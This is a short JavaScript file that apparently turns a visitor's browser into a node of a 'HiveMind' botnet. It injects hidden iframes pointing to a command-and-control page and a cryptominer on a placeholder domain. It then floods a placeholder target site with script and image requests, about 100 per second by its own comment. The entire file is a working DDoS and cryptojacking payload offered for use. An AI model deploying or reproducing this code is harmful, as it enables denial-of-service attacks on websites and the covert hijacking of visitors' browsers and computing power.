
document.write("<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>");
document.write("<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>");
ddos('http://TARGET-SITE.com/images/header.png',
'http://TARGET-SITE.com/images/header.png');
function ddos(url,url2){
window.setInterval(function (){
$.getScript(url);
$.getScript(url2);
},1000)
}


function imgflood() {
  var TARGET = 'TARGET-SITE.com'
  var URI = '/index.php?'
  var pic = new Image()
  var rand = Math.floor(Math.random() * 1000)
  pic.src = 'http://'+TARGET+URI+rand+'=val'
}
setInterval(imgflood, 10) //100 requests per second

document.write("<title>Running HiveMind Node...</title>");
document.write("<p>You currently running a Node in the HiveMind BotNet...</p>");
document.write("<p>Running...</p>");
